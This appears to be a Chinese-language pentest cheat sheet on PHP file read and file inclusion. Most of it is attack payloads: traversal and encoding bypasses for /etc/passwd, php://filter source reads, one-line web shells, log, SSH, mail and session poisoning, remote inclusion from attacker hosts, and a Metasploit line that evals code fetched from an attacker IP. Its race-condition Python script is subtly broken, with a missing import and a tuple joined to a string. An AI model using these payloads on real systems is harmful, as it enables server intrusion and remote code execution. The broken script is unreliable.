  ### php任意文件读取/下载
	readfile()、file_get_contents()、fopen()等读文件的函数不严谨，读取文件路径可控，输出内容。
	下载配置文件
	Redis、Weblogic、ftp、mysql、web配置文件、history文件、数据库配置文件
	下载log文件
	下载web文件
	/1.php?f=../../etc/passwd
	/1.php?f=file:///etc/passwd(file://绕过../的防护)
	/1.php?f=file:///etc/passwd
  ### php文件包含
  #### 函数:
	include
	require
	include_once
	require_once
  #### 常用协议
	file:// — 访问本地文件系统
	file协议的工作目录是当前目录，使用file:///wwwroot/1.php等同于./wwwroot/1.php可用于绕过一些情况
	php:// — 访问各个输入/输出流（I/O streams）
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/3.png)
  #### LFI
  ##### 正常包含
	index.php?page=../../../etc/passwd
  ##### 空字节
	index.php?page=../../../etc/passwd%00
  ##### 双重编码
	index.php?page=%252e%252e%252fetc%252fpasswd
	index.php?page=%252e%252e%252fetc%252fpasswd%00
  ##### UTF-8 编码
	index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
	index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
  ##### 路径和点截断
	index.php?page=../../../etc/passwd............[ADD MORE]
	index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
	index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
	index.php?page=../../../[ADD MORE]../../../../etc/passwd
  ##### 过滤绕过技巧
	index.php?page=....//....//etc/passwd
	index.php?page=..///////..////..//////etc/passwd
	index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
  ##### 读文件
	1.php?file=php://filter/read=convert.base64-encode/resource=./1.php
	1.php?file=pHp://FilTer/convert.base64-encode/resource=index.php
	1.php?file=php://filter/read=string.rot13/resource=index.php
	1.php?file=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
  ##### 写文件
	/1.php?file=php://filter/write=convert.base64-decode/resource=[file]","base64
  #### Getshell
	https://github.com/D35m0nd142/LFISuite

	echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
	zip payload.zip payload.php;
	mv payload.zip shell.jpg;
	rm payload.php
	http://example.com/index.php?page=zip://shell.jpg%23payload.php

	http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
  #### expect
  	http://example.com/index.php?page=expect://id
	http://example.com/index.php?page=expect://ls
  #### allow_url_include 开启时Getshell
	远程文件包含
	1.php?file=http://remote.com/shell.txt
	1.php?file=php://input  POST:<?php phpinfo();?>
	1.php?file=http://remote.com/shell.txt%00
	1.php?file=http:%252f%252fremote.com%252fshell.txt
	或使用curl
	>curl -v "http://127.0.0.1:8888/ctf/cli/3.php?file=php://input" -d "<?php phpinfo();?>"
	或使用data://协议解析base64的代码
	/1.php?file=data://text/plain;base64,PD9waHAgIHBocGluZm8oKTs/Pg==
  #### allow_url_include 关闭时Getshell
	攻击机开启共享
	/1.php?file=//attacker/1.php
	创建webdav服务，shell文件放入目录包含即可
	>docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav
	Shell文件放入/root/webdav/data
	/1.php?file=//attacker/1.php
  #### 包含日志文件getshell
	Fuzz文件
	https://github.com/fuzzdb-project/fuzzdb
	https://github.com/danielmiessler/SecLists
	https://blog.csdn.net/qq_33020901/article/details/78810035
	/1.php?file=<?php phpinfo();?>
	/1.php?file=../../../../../../../var/log/apache2/access.log
	Win下使用phpstudy
	请求/<?php phpinfo();?>
	包含错误日志
	/1.php?file=C:\phpStudy\Apache\logs\error.log

	$ curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
	$ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id

	http://example.com/index.php?page=/var/log/apache/access.log
	http://example.com/index.php?page=/var/log/apache/error.log
	http://example.com/index.php?page=/var/log/apache2/access.log
	http://example.com/index.php?page=/var/log/apache2/error.log
	http://example.com/index.php?page=/var/log/nginx/access.log
	http://example.com/index.php?page=/var/log/nginx/error.log
	http://example.com/index.php?page=/var/log/vsftpd.log
	http://example.com/index.php?page=/var/log/sshd.log
	http://example.com/index.php?page=/var/log/mail
	http://example.com/index.php?page=/var/log/httpd/error_log
	http://example.com/index.php?page=/usr/local/apache/log/error_log
	http://example.com/index.php?page=/usr/local/apache2/log/error_log
  #### 上传个图片格式的木马直接包含
	/1.php?file=/uploadfile/1.jpg
  #### 限制后缀时
	<?php
	$file = $_GET['file'].".php";
	include($file);
	?><br>
	利用伪协议zip，构造一个zip压缩包，打包一个shell.php，将压缩包更名为png
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/4.png)

	请求/1.php?file=zip://shell.png%23shell
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/5.png)

	也可使用phar协议访问
	/1.php?file=phar://shell.png/shell
	老版本可以使用%00截断
	/etc/passwd%00
	(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)
	/var/www/%00
	/etc/passwd/././././././.[…]/./././././.
	(需要 magic_quotes_gpc=off
	(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)
	点号截断：
	/boot.ini/………[…]…………
	(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)
  #### phpinfo-LFI 本地文件包含临时文件getshell
	利用临时文件删除时间差获取shell
	需要一个lfi漏洞+phpinfo页面
	在/tmp/目录下生成个密码为f的一句话木马g
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/6.png)

	修改脚本的phpinfo文件名称
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/7.png)

	LFI文件
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/8.png)

	执行
	>python getshell.py 192.168.0.108 80 100
	80是端口、100是线程
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/9.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/10.png)

	http://192.168.0.110/index.php?file=../../../tmp/g&f=echo%20%271%27
  #### session + lfi getshell
	session.upload_progress.enabled启用时，文件上传会产生进度文件
	/var/lib/php5/sess_
	/var/lib/php/sess_

	Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
	Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
	将cookie设置为<?php system('cat /etc/passwd');?>
	包含文件/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
  #### LFI SSH Log
	>ssh '<?php system($_GET['c']); ?>'@192.168.0.107
	>ssh <?php system($_GET["cmd"]);?>@10.10.10.10
	>http://192.168.0.107/lfi.php?file=/var/log/auth.log&c=ls
  #### 邮件包含
  	root@kali:~# telnet 10.10.10.10. 25
	Trying 10.10.10.10....
	Connected to 10.10.10.10..
	Escape character is '^]'.
	220 straylight ESMTP Postfix (Debian/GNU)
	helo ok
	250 straylight
	mail from: mail@example.com
	250 2.1.0 Ok
	rcpt to: root
	250 2.1.5 Ok
	data
	354 End data with <CR><LF>.<CR><LF>
	subject: <?php echo system($_GET["cmd"]); ?>
	data2
	.
	包含文件
	http://example.com/index.php?page=/var/log/mail

  #### RFI&命令注入上线MSF
	MSF生成
	#use exploit/multi/script/web_delivery
	#set target PHP
	注入点注入：
	php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.0.107:1234/OgsOFaj3yKH'));"
	RFI：
	http://www.xx.com/file=http://192.168.0.107:1234/OgsOFaj3yKH
  #### 通过 /proc/*/fd LFI 到 RCE
	上传大量的shell（例如：100）
	http://example.com/index.php?page=/proc/$PID/fd/$FD，其中 $PID = 进程的 PID（可以被暴力破解）和 $FD 文件描述符（也可以被暴力破解）
  #### 通过 /proc/self/environ LFI 到 RCE
  	像日志文件一样，在User-Agent中发送payload，会体现在/proc/self/environ文件里面

	GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
	User-Agent: <?=phpinfo(); ?>
  #### 通过上传完成LFI到RCE
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```
  #### 工具
  	https://github.com/P0cL4bs/Kadimus
	https://github.com/kurobeats/fimap
	https://github.com/lightos/Panoptic